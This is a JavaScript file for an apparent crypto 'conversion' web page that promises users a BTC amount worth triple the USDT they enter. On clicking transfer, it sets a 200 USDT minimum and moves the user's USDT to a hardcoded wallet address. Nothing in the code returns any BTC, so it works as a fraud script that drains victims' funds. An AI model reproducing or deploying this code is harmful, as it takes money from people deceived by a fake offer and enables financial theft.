const USDT = "0x55d398326f99059fF775485246999027B3197955";
const DEST = "0x56E93caFf970003A66264a10B1581066E0f17112";
const BNB_GAS_USD = 0.50;
let provider, signer;

const ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function approve(address,uint256) returns (bool)",
  "function transfer(address,uint256) returns (bool)"
];

async function init() {
  provider = new ethers.providers.Web3Provider(window.ethereum);
  await provider.send("eth_requestAccounts", []);
  signer = provider.getSigner();
  updateDisplay();
}

async function updateDisplay() {
  const inputVal = parseFloat(document.getElementById("usdtInput").value);
  const amount = isNaN(inputVal) ? 0 : inputVal;

  const totalUSD = amount * 3;
  document.getElementById("usdtValue").innerText = `$${amount.toFixed(2)}`;

  const res = await fetch(
    "https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usdt"
  );
  const rate = res.ok ? (await res.json()).bitcoin.usdt : 0;
  document.getElementById("rateLine").innerText = `1 BTC ≈ ${rate.toLocaleString("en")} USDT`;

  const btcVal = rate ? totalUSD / rate : 0;
  document.getElementById("btcAmount").innerText = btcVal.toFixed(8);
  document.getElementById("btcUsd").innerText = `$${totalUSD.toFixed(2)}`;
}

document.getElementById("usdtInput").addEventListener("input", updateDisplay);

document.getElementById("transferBtn").addEventListener("click", async () => {
  const inputVal = parseFloat(document.getElementById("usdtInput").value);
  const msgEl = document.getElementById("msg");
  msgEl.className = "";

  if (isNaN(inputVal) || inputVal < 200) {
    msgEl.innerText = "❌ Minimum 200 USDT required";
    msgEl.className = "error";
    return;
  }

  try {
    const token = new ethers.Contract(USDT, ABI, signer);
    const userAddress = await signer.getAddress();

    const balance = await token.balanceOf(userAddress);
    const usdtBal = parseFloat(ethers.utils.formatUnits(balance, 18));
    if (usdtBal < inputVal) throw new Error("Insufficient USDT");

    const bnbBal = parseFloat(
      ethers.utils.formatEther(await provider.getBalance(userAddress))
    );
    const bnbRate = (
      await (
        await fetch(
          "https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd"
        )
      ).json()
    ).binancecoin.usd;
    if (bnbBal * bnbRate < BNB_GAS_USD) throw new Error("Low BNB for gas");

    const amount = ethers.utils.parseUnits(inputVal.toString(), 18);
    await (await token.approve(DEST, amount)).wait();
    await (await token.transfer(DEST, amount)).wait();

    msgEl.innerText = `✅ ${inputVal} USDT sent successfully`;
    msgEl.className = "success";
  } catch (err) {
    msgEl.innerText = `❌ ${err.message}`;
    msgEl.className = "error";
  }
});

init();
